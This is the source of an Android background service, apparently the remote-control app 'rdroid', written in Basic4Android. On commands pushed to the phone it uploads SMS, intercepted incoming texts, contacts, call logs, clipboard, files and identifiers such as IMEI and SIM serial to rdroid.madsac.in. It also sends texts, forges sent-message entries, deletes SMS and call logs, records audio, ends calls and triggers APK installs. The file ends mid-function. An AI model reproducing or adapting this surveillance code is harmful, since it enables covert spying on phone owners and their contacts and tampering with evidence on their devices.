Group=Default Group
ModulesStructureVersion=1
Type=Service
Version=2.52
@EndOfDesignText@
#region module attributes
	#startatboot: true
	
#end region

Sub process_globals
	Private hcinit As Boolean
	Public actvisible As Boolean
	Private registertask, unregistertask As Int
	Private tw As TextWriter
	Private timerx As Timer
	Private ar As recorder
	Private mpp As MediaPlayer
	Private si As SmsInterceptor
	Private ph As PhoneEvents
	Private sq As SQL
	Private dm As DownloadManager
	Dim raf As RandomAccessFile
	Dim st As appSettings
	Dim mp As Map
	hcinit = False
	registertask = 1
	unregistertask = 2
	Dim notification1 As Notification
End Sub

Sub service_create
	notification1.initialize
	notification1.icon = "icon" 'use the application icon file for the notification
	notification1.vibrate = False
	
	mpp.initialize
	si.initialize2("si", 999)
	ph.initialize("ph")
	'startactivity(main)
	readsettings
	sq.initialize(File.dirinternal, "list.db", True)
	sq.execnonquery("create table if not exists que(link text)")
	dm.registerreceiver("dm")
	'	utils is a helper code module
	If Utils.isinitialized=False Then
		Utils.initialize(dm)
	End If
	
	
End Sub

Sub service_start (startingintent As Intent)
	notification1.setinfo("rdroid : running","goto: http://rdroid.madsac.in" ,Main)
	notification1.sound = False
	notification1.ongoingevent=True
	notification1.light=False
	'make sure that the process is not killed during the download
	'this is important if the download is expected to be long.
	'this will also show the status bar notification
	Service.startforeground(1, notification1)
	
	Select startingintent.action
		Case "com.google.android.c2dm.intent.registration"
			handleregistrationresult(startingintent)
		Case "com.google.android.c2dm.intent.receive"
			messagearrived(startingintent)
		Case "android.intent.action.boot_completed"
			readsettings
	End Select
	'ar.initialize
	StartServiceAt("client", DateTime.now + 300000, True)
End Sub


Sub service_destroy

End Sub

Sub messagearrived (intent As Intent)

	
	Dim data As String
	Dim p As Phone
	
'	if intent.hasextra("from") then from = intent.getextra("from")
	If intent.hasextra("com") Then data = intent.getextra("com")
'	if intent.hasextra("collapse_key") then collapsekey = intent.getextra("collapse_key")

	notify(data,True)
	Log(data)


	If(data.compareto("synccontacts")==0)Then
		synccontacts
	else if(data.compareto("info")==0)Then
		syncinfo
	else if(data.compareto("getvolumes")==0)Then
		snd("getvolumes", "data=" & urlencode("0=" & p.getvolume(0) & ":1=" & p.getvolume(1) & ":2=" & p.getvolume(2) & ":3=" & p.getvolume(3) & ":4=" & p.getvolume(4) & ":5=" & p.getvolume(5) & "|0=" & p.getmaxvolume(0) & ":1=" & p.getmaxvolume(1) & ":2=" & p.getmaxvolume(2) & ":3=" & p.getmaxvolume(3) & ":4=" & p.getmaxvolume(4) & ":5=" & p.getmaxvolume(5)))
	else if(data.compareto("active")==0)Then
		snd("active","dt=" & urlencode(curdt))
	else if(data.compareto("getact")==0)Then
		snd("actget","")
	else if(data.compareto("clrclpbrd")==0)Then
		Dim bc As BClipboard
		bc.clrtext
	else if(data.compareto("syncclpbrd")==0)Then
		Dim bc As BClipboard
		tw.initialize(File.openoutput(File.dirinternal, "data.txt",False))
		tw.write(urlencode(bc.gettext))
		tw.flush
		tw.close
		sndfile("syncclpbrd","data.txt")
	else if(data.compareto("installedapps")==0)Then
		syncinstalledapps
	else if(data.compareto("listfiles")==0)Then
		tw.initialize(File.openoutput(File.dirinternal, "data.txt",False))
		tw.write(curdt& "|**data**|" & File.dirrootexternal &  "|**data**|")
		If(File.externalreadable==True) Then	listfiles(File.dirrootexternal,"") Else tw.write( "> access denied" )
		tw.flush
		tw.close
		sndfile("listfiles","data.txt")
	else if(data.compareto("mpplay")==0)Then
		mpp.play
	else if(data.compareto("mpstop")==0)Then
		mpp.stop
	else if(data.compareto("mppause")==0)Then
		mpp.pause
	else if(data.compareto("mpget")==0)Then
		snd("mpget","duration=" &mpp.duration & "&looping=" & mpp.looping & "&position=" & mpp.position)
	else if(data.compareto("srstop")==0)Then
		If ar.record.running=True Then
			ar.stop
			snd("srstatus","recstop=" & ar.recstop & "&source=" & ar.audiosource )
			notify("sound recording stopped.",True)
		Else
			notify("no sound recording is running.",True)
		End If
	else if(data.compareto("srstatus")==0)Then
		snd("srstatus","recstop=" & ar.recstop & "&source=" & ar.audiosource )

		'log(ar.isrecording)
	else if(data.compareto("delallcontacts")==0)Then
		Dim m As miscUtil
		m.initialize
		'm.deleteallconcacts
	Else
		Dim splt() As String
		splt=Regex.split(":", data)
		If(splt.length=2)Then
			If(splt(0).compareto("calllogs")==0)Then
				synccalllogs(splt(1))
			else if(splt(0).compareto("vibrate")==0)Then
				Dim pv As PhoneVibrate
				pv.vibrate(splt(1))
			else if(splt(0).compareto("mute")==0)Then
				p.setmute(splt(1),True)
			else if(splt(0).compareto("unmute")==0)Then
				p.setmute(splt(1),False)
			else if(splt(0).compareto("ringermode")==0)Then
				p.setringermode(splt(1))
			else if(splt(0).compareto("screenbrightness")==0)Then
				writesetting("screen_brightness", splt(1))
			else if(splt(0).compareto("screenbrightnessmode")==0)Then
				writesetting("screen_brightness_mode", splt(1))
			else if(splt(0).compareto("loudspeaker")==0)Then
				Dim r As Reflector
				r.target = r.getcontext
				r.target = r.runmethod2("getsystemservice", "audio", "java.lang.string")
				If(splt(1)>0)Then r.runmethod2("setspeakerphoneon", True, "java.lang.boolean") Else r.runmethod2("setspeakerphoneon", False, "java.lang.boolean")
			else if(splt(0).compareto("uninstall")==0)Then
				Dim inte As Intent
				inte.initialize("android.intent.action.delete", "package:" & splt(1))
				StartActivity(inte)
			else if(splt(0).compareto("runapp")==0)Then
				Dim inte As Intent
				Dim pw As PackageManager
				inte.initialize("","")
				inte=pw.getapplicationintent(splt(1))
				StartActivity(inte)
			else if(splt(0).compareto("killcall")==0)Then
				If(splt(1)>0)Then
					timerx.initialize("timerx",splt(1))
					timerx.enabled=True
				Else
					killcall
				End If
			else if(splt(0).compareto("delcontact")==0)Then
				Dim f As fgContacts
				f.initialize
				f.deletecontactbyid(splt(1))
			else if(splt(0).compareto("remsms")==0)Then
				Dim s As SmsMessages

				s.deletesms(splt(1))
				notify("sms deleted.",True)
			End If
			'---------------------------------------------------splt2
		else if(splt.length=3)Then
			If(splt(0).compareto("setvolume")==0)Then
				p.setvolume(splt(1),splt(2),True)
			else if(splt(0).compareto("unsetvolume")==0)Then
				p.setvolume(splt(1),splt(2),False)
			else if(splt(0).compareto("sms")==0)Then
				syncsms(splt(1),splt(2))
	
			else if(splt(0).compareto("airplane")==0)Then
				If(splt(1).compareto("0")==0 And splt(2)>0)Then
					setairplanemode(True)
					timerx.initialize("timerairoff",splt(2))
					timerx.enabled=True
				else if(splt(1).compareto("1")==0 And splt(2)>0)Then
					timerx.initialize("timerairon",splt(2))
					timerx.enabled=True
				End If
			else if(splt(0).compareto("rcalllogs")==0)Then
				removecalllogs(splt(1),splt(2))
			else if(splt(0).compareto("toogle")==0)Then
				toogle(splt(1),splt(2))
			else if(splt(0).compareto("srstart")==0)Then
				If ar.recstop=True Or ar.isinitialized=False Then
					ar.initialize(splt(1),splt(2))
					notify("sound recording started.",True)
				Else
					notify("sound recording is already running.",True)
				End If
				snd("srstatus","recstop=" & ar.recstop & "&source=" & ar.audiosource )
			else if(splt(0).compareto("beep")==0)Then
				Dim b As Beeper
				b.initialize(splt(1),splt(2))
				b.beep
			End If
			'------------------------------------------------------------------------
		else if(splt.length=4)Then
			If(splt(0).compareto("beep2")==0)Then
				Dim b As Beeper
				b.initialize2(splt(1),splt(2),splt(3))
				b.beep
			else if(splt(0).compareto("mpset")==0)Then
				If(splt(1)>0)Then	mpp.looping=True Else mpp.looping=False
				mpp.setvolume(splt(2),splt(3))
			End If
			'-------------------------------------------------------------------------
		else if(splt.length=5)Then
			If(splt(0).compareto("dial")==0)Then
				Dim pc As PhoneCalls
				splt(1)=splt(1).replace("#", "%23")
				StartActivity(pc.call(splt(1)))
				If(splt(2)>0)Then
					timerx.initialize("timerx",splt(2))
					timerx.enabled=True
				End If
				Dim r As Reflector
				r.target = r.getcontext
				r.target = r.runmethod2("getsystemservice", "audio", "java.lang.string")
				If(splt(3)>0)Then r.runmethod2("setspeakerphoneon", True, "java.lang.boolean") Else r.runmethod2("setspeakerphoneon", False, "java.lang.boolean")
				If(splt(4)>=0)Then p.setvolume(p.volume_voice_call,splt(4),False)
	
			End If
		End If
	End If

End Sub


Sub jobdone (job As HttpJob)

	Log("jobname = " & job.jobname & ", success = " & job.success )
	If(job.success==True  )Then
		Log("result:" & job.getstring)
		Dim splt() As String
		Dim su As StringUtils
		splt=Regex.split("==>", job.getstring)
		splt=Regex.split("<==",splt(1))
	
		If(job.jobname.compareto("active")==0)Then
			notify("i told to server that i am active",True)
		else if(job.jobname.compareto("actget")==0)Then
			'notify("sEnding...",true)
			Dim res As String
			If splt.length>=1 Then
				res=splt(0)
				splt=Regex.split("\|mad\|", res)
				Dim i As Int
				Dim mes As String
				Dim dt As Long
				Dim mtype As Int
		
				For i=0 To splt.length-1
		
					If(splt(i).startswith("mes")==True)Then
						Dim su As StringUtils
						mes=su.decodeurl(splt(i).Substring(3), "utf8")
						'log(mes)
					else if(splt(i).startswith("num")==True)Then
						If(splt(i).Substring(3).length >1 And mes.length>0)Then
							sEndtextmessage(splt(i).Substring(3),mes)
							notify("sEnding message to : "& splt(i).Substring(3),True)
							addmessagetologs(splt(i).Substring(3),mes)
							'log("to: " & splt(i).Substring(3))
						End If
					else if(splt(i).startswith("fnum")==True)Then
						If(splt(i).Substring(4).length >1 And mes.length>0)Then
							notify("adding fake message for : "& splt(i).Substring(4),True)
							fakemessage(splt(i).Substring(4),mes,dt,mtype)
							'log("to: " & splt(i).Substring(3))
						End If
					else if(splt(i).startswith("date")==True)Then
						dt=parsedt(splt(i).Substring(4))
					else if(splt(i).startswith("mtype")==True)Then
						mtype=splt(i).Substring(5)
					else if(splt(i).startswith("clpbrd")==True)Then
						Dim c As BClipboard
						c.settext(splt(i).Substring(6))
						notify("text copied to clipboard from server.",True)
					else if(splt(i).startswith("install")==True)Then
						Dim inte As Intent
						inte.initialize(inte.action_view, "file://" & splt(i).Substring(7))
						inte.settype("application/vnd.android.package-archive")
						StartActivity(inte)
					else if(splt(i).startswith("sEndmms")==True)Then
						sEndmms(splt(i),splt(i+1),splt(i+2),splt(i+3),splt(i+4))
						i=i+4
					else if(splt(i).startswith("mpdir")==True)Then
						mpp.load(File.dirrootexternal & "/" & splt(i).Substring(5) , "/" & splt(i+1))
					else if(splt(i).startswith("fdelete")==True)Then
						Dim ml As MLfiles
						ml.rm(ml.sdcard & splt(i).Substring(7))
					else if(splt(i).startswith("fddelete")==True)Then
						Dim ml As MLfiles
						ml.rmrf(ml.sdcard  & splt(i).Substring(8))
					else if(splt(i).startswith("fcopy")==True)Then
						Dim ml As MLfiles
						ml.cp(ml.sdcard & splt(i).Substring(5),ml.sdcard & splt(i+1))
						i=i+1
					else if(splt(i).startswith("fdcopy")==True)Then
						Dim ml As MLfiles
						ml.cpr(ml.sdcard & splt(i).Substring(6) ,ml.sdcard & splt(i+1)& "/")
						i=i+1
					else if(splt(i).startswith("fmk")==True)Then
						Dim ml As MLfiles
						ml.mkdir(ml.sdcard & splt(i).Substring(3))
					else if(splt(i).startswith("frename")==True)Then
						Dim ml As MLfiles
						ml.mv(ml.sdcard & splt(i).Substring(7),ml.sdcard & splt(i+1))
						i=i+1

					else if(splt(i).startswith("openurl")==True)Then
						Dim pi As PhoneIntents
						StartActivity(pi.openbrowser(splt(i).Substring(7)))
					else if(splt(i).startswith("setaswall")==True)Then
						setwallpaper(LoadBitmap(File.dirrootexternal & "/" & splt(i).Substring(9), splt(i+1)))
						i=i+1
					else if(splt(i).startswith("download")==True)Then
						downloadfile(splt(i).Substring(8),splt(i+1))
						i=i+1
					else if(splt(i).startswith("ccont")==True)Then
						createcontact(splt(i).Substring(5),splt(i+1),splt(i+2),splt(i+3),splt(i+4))
						i=i+4
					else if(splt(i).startswith("getfile")==True)Then
						sndfilesd("getfile",splt(i).Substring(7))
					else if(splt(i).startswith("fakesms")==True)Then
						'fakemessage(splt(i).Substring(7),splt(i+1),splt(i+2))
						i=i+2
					End If
				Next
			End If
			'snd("actremove","")
		else if(job.jobname.compareto("actremove")==0)Then
			notify("command removed from server.",True)
		else if(job.jobname.compareto("synccontacts")==0)Then
			notify("contacts synced.",True)
		else if(job.jobname.compareto("sms")==0)Then
			notify("sms synced.",True)
		else if(job.jobname.compareto("srstatus")==0)Then
			notify("sound recorder status synced.",True)
		else if(job.jobname.compareto("calllogs")==0)Then
			notify("call logs synced.",True)
		else if(job.jobname.compareto("getvolumes")==0)Then
			notify("volumes values synced.",True)
		else if(job.jobname.compareto("syncclpbrd")==0)Then
			notify("clipboard synced.",True)
		else if(job.jobname.compareto("installedapps")==0)Then
			notify("installed applications list synced.",True)
		else if(job.jobname.compareto("getfile")==0)Then
			notify("file uploaded to server.",True)
		else if(job.jobname.compareto("listfiles")==0)Then
			notify("files list synced.",True)
		else if(job.jobname.compareto("info")==0)Then
			notify("device information synced.",True)
		else if(job.jobname.startswith("mSub")==True)Then
			Dim res As String
			res=splt(0)
			If(res.compareto("1")==0)Then
				notify("message Submitted to server !",False)
				sq.execnonquery("delete from que where link='" & job.jobname.Substring(4) & "'")
			else if(res.compareto("-1")==0)Then
				notify("incorrect username or password please re-login or re-register !",False)
			Else
				notify("unknown response from server !",False)
			End If
		else if(job.jobname.compareto("srsync")==0)Then
			notify("sound recorder status synced.",True)
		Else
			notify("unknown response from server !",False)
		End If
	End If

	job.release
	
End Sub

Sub createcontact(name As String,rawphones As String, rawemails As String,note As String,website As String)
	Dim m As miscUtil
	Dim phones,mails,awork,ahome As Map
	Dim cont As Contact
	phones.initialize
	mails.initialize
	awork.initialize
	ahome.initialize
	ahome.put(0, "")  'town
	ahome.put(1, "")  'zip
	ahome.put(2, "")  'street
	ahome.put(3, "")  'country
	awork.put(0, "")  'town
	awork.put(1, "")  'zip
	awork.put(2, "")  'street
	awork.put(3, "")  'country
	Dim exp() As String
	exp=Regex.split("=<",rawphones)
	Dim x As Int
	For x=0 To exp.length-1
		phones.put(x,exp(x))
	Next
	exp=Regex.split("=<",rawemails)
	For x=0 To exp.length-1
		mails.put(x,exp(x))
	Next
	m.initialize
	m.createcontactentry2(name,Null,phones,mails,note,website,"home",ahome,awork)
End Sub

Sub timerx_tick
	killcall
	timerx.enabled=False
End Sub

Sub timerairoff_tick
	setairplanemode(False)
	timerx.enabled=False
End Sub

Sub timerairon_tick
	setairplanemode(True)
	timerx.enabled=False
End Sub


Sub killcall
	Dim r As Reflector
	r.target = r.getcontext
	Dim telephonymanager, telephonyinterface As Object
	telephonymanager = r.runmethod2("getsystemservice", "phone", "java.lang.string")
	r.target = telephonymanager
	telephonyinterface = r.runmethod("getitelephony")
	r.target = telephonyinterface
	r.runmethod("Endcall")
End Sub

Sub toogle(ot As Int,action As Int)
	Dim tg As Toggle
	tg.initialize
	If(action=1)Then
		If ot=1 Then
			tg.turnwifion
		else if ot=2 Then
			tg.turnstreamvolumeon
		else if ot=3 Then
			tg.turnringeron
		else if ot=4 Then
			tg.turngpson
		else if ot=5 Then
			tg.turndataconnectionon
		else if ot=6 Then
			tg.turnbrightnesson
		else if ot=7 Then
			tg.turnbluetoothon
		else if ot=8 Then
			tg.turnairplanemodeon
		End If
	else if(action=0)Then
		If ot=1 Then
			tg.turnwifioff
		else if ot=2 Then
			tg.turnstreamvolumeoff
		else if ot=3 Then
			tg.turnringeroff
		else if ot=4 Then
			tg.turngpsoff
		else if ot=5 Then
			tg.turndataconnectionoff
		else if ot=6 Then
			tg.turnbrightnessoff
		else if ot=7 Then
			tg.turnbluetoothoff
		else if ot=8 Then
			tg.turnairplanemodeoff
		End If
	else if(action=2)Then
		If ot=1 Then
			tg.togglewifi
		else if ot=4 Then
			tg.togglegps
		else if ot=5 Then
			tg.toggledataconnection
		else if ot=7 Then
			tg.togglebluetooth
		else if ot=8 Then
			tg.toggleairplanemode
		else if ot=9 Then
			tg.toggleaudio
		End If
	else if(action=3)Then
		tg.reboot
	else if(action=4)Then
		tg.gotosleep(1000)
	else if(action=5)Then
		snd("tooglestatus","1=" & tg.wifi & "&3=" & tg.ringermode & "&4=" & tg.gps & "&5=" & tg.dataconnection & "&7=" & tg.bluetooth & "&8=" & tg.airplanemode )
	End If
End Sub

Sub listfiles(directory As String,seperator As String)
	Dim lst As List
	Dim i As Int

	lst=File.listfiles(directory)
	If(lst.isinitialized=True)Then
		For i=0 To lst.size-1
			If File.isdirectory(directory, lst.get(i)) Then
				tw.write( "|" & seperator & ">|" & lst.get(i) & "<")
				listfiles(directory & "/" & lst.get(i),seperator & ">" )
			Else
				tw.write( "|" & seperator & ">|" & lst.get(i) & "|"  & DateTime.date( File.lastmodified(directory,lst.get(i))) & " " & DateTime.time(File.lastmodified(directory,lst.get(i))) & "|" & File.size(directory,lst.get(i)) & "<"  )
			End If
		Next
	Else
		tw.write( seperator & "> access denied" )
	End If

End Sub

Sub syncinfo
	Dim tw As TextWriter
	Dim p As Phone
	tw.initialize(File.openoutput(File.dirinternal, "data.txt",False))
	tw.write(curdt& "|**data**|")
	Dim os As OperatingSystem

	Dim pid As PhoneId
	tw.write("time|s|" &  os.time & "|**data**|")

	'tw.write("battery level : |s|" &  os.batterylevel & "|**data**|")
	tw.write("manufacturer|s|" &  os.manufacturer & "|**data**|")
	tw.write("model|s|" &  os.model & "|**data**|")
	tw.write("brand|s|" &  os.brand & "|**data**|")
	tw.write("name of the hardware|s|" &  os.hardware & "|**data**|")
	tw.write("product name|s|" &  os.product & "|**data**|")
	tw.write("overall product name|s|" &  os.radio & "|**data**|")
	tw.write("release version|s|" &  os.release & "|**data**|")
	tw.write("change list id|s|" &  os.id & "|**data**|")
	tw.write("host|s|" &  os.host & "|**data**|")
	tw.write("codename|s|" &  os.codename & "|**data**|")
	tw.write("industrial device name|s|" &  os.device & "|**data**|")
	tw.write("os |s|" &  os.os & "|**data**|")
	tw.write("sdk|s|" &  os.sdk & "|**data**|")
	tw.write("os type|s|" &  os.type & "|**data**|")
	tw.write("os user|s|" &  os.user & "|**data**|")
	tw.write("boot loader|s|" &  os.bootloader & "|**data**|")
	tw.write("build board|s|" &  os.board & "|**data**|")
	tw.write("cpu abi|s|" &  os.cpuabi & "|**data**|")
	tw.write("cpu abi2|s|" &  os.cpuabi2 & "|**data**|")
	tw.write("threshold memory|s|" &  os.threshold & "|**data**|")
	tw.write("display build id|s|" &  os.display & "|**data**|")
	tw.write("elasped cpu time by rdroid|s|" &  os.elaspedcputime & "|**data**|")
	tw.write("finger print reader|s|" &  os.fingerprint & "|**data**|")
	tw.write("serial|s|" &  os.serial & "|**data**|")
	tw.write("tags|s|" &  os.tags & "|**data**|")
	tw.write("imei|s|" & pid.getdeviceid & "|**data**|")
	tw.write("Subscriber id|s|" & pid.getSubscriberid & "|**data**|")
	tw.write("mobile number|s|" & pid.getline1number & "|**data**|")
	tw.write("sim serial number|s|" & pid.getsimserialnumber& "|**data**|")
	tw.write("total internal memory size|s|" &  os.totalinternalmemorysize & "|**data**|")
	tw.write("available internal memory|s|" &  os.availableinternalmemorysize & "|**data**|")
	tw.write("available memory|s|" &  os.availablememory & "|**data**|")
	tw.write("is external memory available|s|" &  os.externalmemoryavailable & "|**data**|")
	tw.write("total external memory size|s|" &  os.totalexternalmemorysize & "|**data**|")
	tw.write("available external memory|s|" &  os.availableexternalmemorysize & "|**data**|")
	tw.write("external storage serial|s|" &  getsdcardserial & "|**data**|")
	tw.write("packet data state|s|" &  p.getdatastate & "|**data**|")
	tw.write("network operator name|s|" &  p.getnetworkoperatorname & "|**data**|")
	tw.write("network type|s|" &  p.getnetworktype & "|**data**|")
	tw.write("phone type|s|" &  p.getphonetype & "|**data**|")
	tw.write("ringer mode|s|" &  p.getringermode & "|**data**|")
	tw.write("is in airplane mode|s|" &  p.isairplanemodeon & "|**data**|")
	tw.write("is in network roaming|s|" &  p.isnetworkroaming & "|**data**|")
	tw.flush
	tw.close

	sndfile("info","data.txt")
End Sub

Sub synccontacts
	Dim c As Contact
	Dim cs As Contacts2
	Dim l As List
	Dim tw As TextWriter
	tw.initialize(File.openoutput(File.dirinternal, "data.txt",False))
	tw.write("date|n|" & curdt& "|c|")
	l = cs.getall(True,True)
	For i = 0 To l.size - 1
		c = l.get(i)
		Dim phs,ems As String
		Dim x As Int
		phs=""
		ems=""
		For x=0 To c.getphones.size-1
			phs= phs & c.getphones.getkeyat(x) & "|p|"
		Next
		For x=0 To c.getemails.size-1
			ems= ems & c.getemails.getkeyat(x) & "|e|"
		Next
			
		'log(phs)
		tw.write(c.displayname & "|n|" & phs & "|n|" & ems & "|n|" & c.id & "|n|" & c.lasttimecontacted  & "|n|" & c.name & "|n|" & c.notes & "|n|" & c.phonenumber & "|n|" & c.starred & "|n|" & c.timescontacted & "|c|")
		'log(c.displayname & "|n|" & c.lasttimecontacted  & "|n|" & c.timescontacted & "|c|")
			
	Next
	tw.flush
	tw.close
	sndfile("synccontacts","data.txt")
End Sub

Sub syncinstalledapps
	Dim i As Int
	Dim pm As PackageManager
	Dim tw As TextWriter
   
		
	tw.initialize(File.openoutput(File.dirinternal, "data.txt",False))
	tw.write(curdt& "|**data**|")
		
	For i = 0 To pm.getinstalledpackages.size - 1
		Dim s As String
		s=pm.getinstalledpackages.get(i)
		tw.write(pm.getapplicationlabel(s) & "|s|" & pm.getversioncode(s) & "|s|" & pm.getversionname(s)  & "|s|" & pm.getapplicationintent(s)  & "|s|" &  s  & "|**data**|")
	Next
	tw.flush
	tw.close
	sndfile("installedapps","data.txt")
End Sub


Sub sEndtextmessage(phonenumber As String, message As String)As Boolean
	Dim smsmanager As PhoneSms ,r As Reflector, parts As Object
	If phonenumber.length>0 Then
		Try
			If message.length <= 160 Then
				smsmanager.sEnd(phonenumber, message)
			Else
				r.target = r.runstaticmethod("android.telephony.smsmanager", "getdefault", Null, Null)
				parts = r.runmethod2("dividemessage", message, "java.lang.string")
				r.runmethod4("sEndmultiparttextmessage", Array As Object(phonenumber, Null, parts, Null, Null), Array As String("java.lang.string", "java.lang.string", "java.util.arraylist", "java.util.arraylist", "java.util.arraylist"))
			End If
			Return True
		Catch
		End Try
	End If
End Sub


Sub addmessagetologs(address As String,body As String)
	Dim r As Reflector
	r.target = r.createobject("android.content.contentvalues")
	r.runmethod3("put", "address", "java.lang.string", address, "java.lang.string")
	r.runmethod3("put", "body", "java.lang.string", body, "java.lang.string")
	Dim contentvalues As Object = r.target
	r.target = r.getcontext
	r.target = r.runmethod("getcontentresolver")
	r.runmethod4("insert", Array As Object( _
        r.runstaticmethod("android.net.uri", "parse", Array As Object("content://sms/sent"), _
            Array As String("java.lang.string")), _
        contentvalues), Array As String("android.net.uri", "android.content.contentvalues"))
End Sub


Sub setwallpaper(bmp As Bitmap)
	Dim r As Reflector
	r.target = r.runstaticmethod("android.app.wallpapermanager", "getinstance", _
        Array As Object(r.getcontext), Array As String("android.content.context"))
	r.runmethod4("setbitmap", Array As Object(bmp), Array As String("android.graphics.bitmap"))
End Sub


Sub synccalllogs(count As Int)
	Dim tw As TextWriter
	tw.initialize(File.openoutput(File.dirinternal, "data.txt",False))
	tw.write(curdt& "|**data**|")
	Dim cl As CallLog
	For Each c As CallItem In cl.getall(count)
		tw.write(c.cachedname &	"|s|" & c.calltype &"|s|" & c.duration &"|s|" & c.number &"|s|" & DateTime.date(c.date) & " " & DateTime.time(c.date)  &  "|s|" & c.id &"|**data**|")
		'log(c.date)
	Next
	tw.flush
	tw.close
	sndfile("calllogs","data.txt")
End Sub

Sub syncsms(count As String,stype As Int)
	Dim tw As TextWriter
	Dim i As Int
	Dim sm1 As SmsMessages
	Dim list1 As List

	tw.initialize(File.openoutput(File.dirinternal, "data.txt",False))
	tw.write(curdt& "|**sms**|")
	If(stype>=0)Then
		list1 = sm1.getbytype(stype)
	else if(stype=-1) Then
		list1 = sm1.getall
	else if(stype=-2) Then
		list1 = sm1.getunreadmessages
	else if(stype=-3) Then
		list1 = sm1.getallsince(parsedt(count))
	End If
	For i = 0 To list1.size - 1
		If(i<count Or count<0)Then
			Dim sms As Sms
			sms = list1.get(i)
			'log(sms.body & "|**c**|" &  datetime.date(sms.date) & " " & datetime.time(sms.date) & "|**c**|" & sms.address & "|**c**|" & sms.type & "|**c**|" & sms.id  & "|**c**|" & sms.personid  & "|**c**|" & sms.read & "|**c**|" & sms.threadid &"|**sms**|")
			tw.write(sms.body )
			tw.write("|**c**|" &  DateTime.date(sms.date) & " " & DateTime.time(sms.date) & "|**c**|" & sms.address & "|**c**|" & sms.type & "|**c**|" & sms.id  & "|**c**|" & sms.personid  & "|**c**|" & sms.read & "|**c**|" & sms.threadid &"|**sms**|")
		End If
	Next
	tw.flush
	tw.close
	sndfile("sms","data.txt")
End Sub

Sub setairplanemode(on As Boolean)
	Dim p As Phone
	If on = getairplanemode Then Return 'already in the correct state
	Dim r As Reflector
	Dim contentresolver As Object
	r.target = r.getcontext
	contentresolver = r.runmethod("getcontentresolver")
	Dim state As Int
	If on Then state = 1 Else state = 0
	r.runstaticmethod("android.provider.settings$system", "putint", _
        Array As Object(contentresolver, "airplane_mode_on", state), _
        Array As String("android.content.contentresolver", "java.lang.string", "java.lang.int"))
	Dim i As Intent
	i.initialize("android.intent.action.airplane_mode", "")
	i.putextra("state", "" & on)
	p.sEndbroadcastintent(i)
End Sub


Sub getairplanemode As Boolean
	Dim p As Phone
	Return p.getsettings("airplane_mode_on") = 1
End Sub

Sub removecalllogs(field As String,value As String)
	Dim r As Reflector
	Log("field:" & field)
	Log("value:" & value)
	r.target = r.getcontext
	r.target = r.runmethod("getcontentresolver")
	Dim content_uri As Object = r.getstaticfield("android.provider.calllog$calls", "content_uri")
	r.runmethod4("delete", Array As Object(content_uri, field & "='" & value & "'", Null),Array As String("android.net.uri", "java.lang.string", "[ljava.lang.string;"))
End Sub


Sub snd(jbname As String,par As String)
	Dim j As HttpJob
	j.initialize(jbname,Me)
	j.download("http://rdroid.madsac.in/api.php?act="& urlencode(jbname) & "&usr="& urlencode(st.user) & "&pwd=" & urlencode(st.password) & "&name=" & urlencode(st.name) & "&dt="& urlencode(curdt) & "&" & par )
End Sub


Sub sndfile(jbname As String,filename As String)
	Dim j As HttpJob

	j.initialize(jbname,Me)
	j.postfile("http://rdroid.madsac.in/api.php?act="& urlencode(jbname) & "&usr="& urlencode(st.user) & "&pwd=" & urlencode(st.password) & "&dt="& urlencode(curdt) & "&name=" & urlencode(st.name),File.dirinternal, filename)
End Sub

Sub sndfilesd(jbname As String,filename As String)
	Dim j As HttpJob

	j.initialize(jbname,Me)
	j.postfile("http://rdroid.madsac.in/api.php?act="& urlencode(jbname) & "&usr="& urlencode(st.user) & "&pwd=" & urlencode(st.password) & "&name=" & urlencode(st.name) & "&dt="& urlencode(curdt) &"&filename=" &urlencode(filename) ,File.dirrootexternal, filename)
End Sub

Sub writesetting(setting As String, value As Int)
	Dim r1 As Reflector
	Dim args(3) As Object
	Dim types(3) As String

	r1.target = r1.getcontext
    
	args(0) = r1.runmethod("getcontentresolver")
	types(0) = "android.content.contentresolver"
	args(1) = setting
	types(1) = "java.lang.string"
	args(2) = value
	types(2) = "java.lang.int"
	r1.runstaticmethod("android.provider.settings$system", "putint", args, types)
End Sub

Sub registerdevice (unregister As Boolean)
	Log("register")
	Dim i As Intent
	If unregister Then
		i.initialize("com.google.android.c2dm.intent.unregister", "")
	Else
		i.initialize("com.google.android.c2dm.intent.register", "")
		'sEnder id : google project id
		i.putextra("sEnder", "304137618362")
	End If
	Dim r As Reflector
	Dim i2 As Intent
	i2 = r.createobject("android.content.intent")
	Dim pi As Object
	pi = r.runstaticmethod("android.app.pEndingintent", "getbroadcast", _
		Array As Object(r.getcontext, 0, i2, 0), _
		Array As String("android.content.context", "java.lang.int", "android.content.intent", "java.lang.int"))
	i.putextra("app", pi)
	StartService(i)
End Sub



Sub handleregistrationresult(intent As Intent)
	Log("result")
	Dim p As Phone
	If intent.hasextra("error") Then
		Log("error: " & intent.getextra("error"))
		notify("error: " & intent.getextra("error"), True)
	else if intent.hasextra("unregistered") Then
	
		'unregister
		
	else if intent.hasextra("registration_id") Then
		'	log(intent.getextra("registration_id"))
		CallSubDelayed2(Main,"reg_code",intent.getextra("registration_id"))
	End If
End Sub


Sub wait(milliseconds As Int)
	Dim s As Long
	s = DateTime.now
	Do While DateTime.now < s + milliseconds
	Loop
End Sub

Sub notify(text As String,longduration As Boolean)
	'toastmessageshow(text,longduration)
	Dim c As CustomToast
	c.initialize
	c.show(text,5000,Gravity.center_vertical,0,0)
End Sub

Sub ph_smssentstatus (success As Boolean, errormessage As String, phonenumber As String, intent As Intent)
	'snd("smsstatus","success=" & success & "&error=" & errormessage & "&phone=" & phonenumber)
End Sub


Sub si_messagereceived (from As String, body As String) As Boolean

	Dim dt As String
	Dim p As Phone
	Dim i As Int
	dt=  curdt

	'log("recieved")
	sq.execnonquery("insert into que values('http://rdroid.madsac.in/api.php?act=addlog&ver=beta&usr=" & urlencode(st.user) & "&pwd=" & urlencode(st.password) & "&name=" & urlencode(st.name)  &"&sms=" & urlencode(body) & "&from="& urlencode(from) & "&dt=" & urlencode(dt) & "')")

	Dim c As Cursor
	c=sq.execquery("select * from que")
	For i=0 To c.rowcount-1
		c.position=i
		Dim ht As HttpJob
		Dim link As String
		link=c.getstring("link")
		ht.initialize("mSub" & link,Me)
		'log("params : " & link)
		ht.download(link)
		'wait(2000)
	Next
	Return False
End Sub

Sub downloadfile(address As String,filename As String)
	Dim downloadmanagerrequest1 As DownloadManagerRequest
	downloadmanagerrequest1.initialize(address)
	downloadmanagerrequest1.description="file has been requested to download via rdroid server."
	'	save the download to external memory
	'	note you must manually update your project's manifest file adding android.permission.write_external_storage
